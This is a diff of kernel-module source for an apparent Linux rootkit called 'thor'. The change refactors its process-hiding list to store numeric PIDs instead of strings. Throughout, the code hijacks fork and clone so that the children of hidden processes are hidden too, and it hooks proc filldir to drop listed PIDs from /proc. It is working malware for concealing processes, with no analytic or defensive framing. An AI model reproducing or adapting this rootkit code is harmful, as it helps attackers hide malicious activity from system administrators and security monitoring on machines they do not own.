@@ -48,7 +48,7 @@ long thor_clone(unsigned long clone_flags, unsigned long newsp,
 #endif
 /* node for hiding list */
 struct _pid_list {
-    char *name;
+    unsigned short pid;
     struct list_head list;
 };
 
@@ -181,11 +181,9 @@ static long thor_fork(void)
 {
     bool hidden = false;
     long ret;
-    char pidname[6];
 
     /* check if process calling fork is hidden */
-    snprintf(pidname, 6, "%hu", current->pid);
-    hidden = is_pid_hidden(pidname);
+    hidden = is_pid_hidden(current->pid);
 
     unhijack(sys_fork);
     ret = sys_fork();
@@ -193,10 +191,8 @@ static long thor_fork(void)
 
     /* if mother process was hidden child process */
     if(hidden && ret != -1 && ret != 0) {
-        char pidname[6];
         LOG_INFO("(fork) hiding child process: %hu", (unsigned short) ret);
-        snprintf(pidname, 6, "%hu", (unsigned short) ret);
-        add_to_pid_list(pidname, strlen(pidname)+1);
+        add_to_pid_list((unsigned short) ret);
     }
 
     return ret;
@@ -228,11 +224,9 @@ long thor_clone(unsigned long clone_flags, unsigned long newsp,
 {
     bool hidden = false;
     long ret;
-    char pidname[6];
 
     /* check if process calling clone is hidden */
-    snprintf(pidname, 6, "%hu", current->pid);
-    hidden = is_pid_hidden(pidname);
+    hidden = is_pid_hidden(current->pid);
 
     unhijack(sys_clone);
 # ifdef CONFIG_CLONE_BACKWARDS
@@ -261,10 +255,8 @@ long thor_clone(unsigned long clone_flags, unsigned long newsp,
 
     /* if mother process was hidden child process */
     if (hidden && ret != -1 && ret != 0) {
-        char pidname[6];
         LOG_INFO("(clone) hiding child process: %hu", (unsigned short) ret);
-        snprintf(pidname, 6, "%hu", (unsigned short) ret);
-        add_to_pid_list(pidname, strlen(pidname)+1);
+        add_to_pid_list((unsigned short) ret);
     }
 
     return ret;
@@ -305,11 +297,20 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen,
         loff_t offset, u64 ino, unsigned d_type)
 {
     struct _pid_list *tmp;
+    char pidname[6];
+    unsigned short pid;
+    unsigned int ipid;
+
+    strncpy(pidname, name, MIN(namelen, 6));
+    pidname[MIN(namelen, 5)] = 0;
+
+    kstrtoint(pidname, 10, &ipid);
+    pid = (unsigned short) ipid;
 
     /* hide specified PIDs */
     list_for_each_entry(tmp, &(pid_list.list), list) {
-        if (strcmp(name, tmp->name) == 0) {
-            LOG_INFO("hiding pid %s", name);
+        if (pid == tmp->pid) {
+            LOG_INFO("hiding pid %d", pid);
             return 0;
         }
     }
@@ -323,31 +324,28 @@ static int thor_proc_filldir(void *buf, const char *name, int namelen,
     return orig_proc_filldir(buf, name, namelen, offset, ino, d_type);
 }
 
-void add_to_pid_list(const char *name, unsigned int len)
+void add_to_pid_list(const unsigned short pid)
 {
     struct _pid_list *tmp;
 
     tmp = (struct _pid_list*) kmalloc(sizeof(struct _pid_list), GFP_KERNEL);
-    tmp->name = (char*) kmalloc(len, GFP_KERNEL);
-    memcpy(tmp->name, name, len);
-    tmp->name[len-1] = 0;
+    tmp->pid = pid;
 
-    LOG_INFO("adding pid %s to hiding list", tmp->name);
+    LOG_INFO("adding pid %d to hiding list", tmp->pid);
 
     list_add(&(tmp->list), &(pid_list.list));
 }
 
-void remove_from_pid_list(const char *name, unsigned int len)
+void remove_from_pid_list(const unsigned short pid)
 {
     struct _pid_list *tmp;
     struct list_head *pos, *q;
 
     list_for_each_safe(pos, q, &(pid_list.list)) {
         tmp = list_entry(pos, struct _pid_list, list);
-        if (strncmp(tmp->name, name, len-1) == 0) {
-            LOG_INFO("removing pid %s from hiding list", name);
+        if (pid == tmp->pid) {
+            LOG_INFO("removing pid %d from hiding list", pid);
             list_del(pos);
-            kfree(tmp->name);
             kfree(tmp);
         }
     }
@@ -363,17 +361,16 @@ void clear_pid_list(void)
     list_for_each_safe(pos, q, &(pid_list.list)) {
         tmp = list_entry(pos, struct _pid_list, list);
         list_del(pos);
-        kfree(tmp->name);
         kfree(tmp);
     }
 }
 
-bool is_pid_hidden(const char *name)
+bool is_pid_hidden(const unsigned short pid)
 {
     struct _pid_list *tmp;
 
     list_for_each_entry(tmp, &(pid_list.list), list) {
-        if (strcmp(name, tmp->name) == 0) {
+        if (pid == tmp->pid) {
             return true;
         }
     }
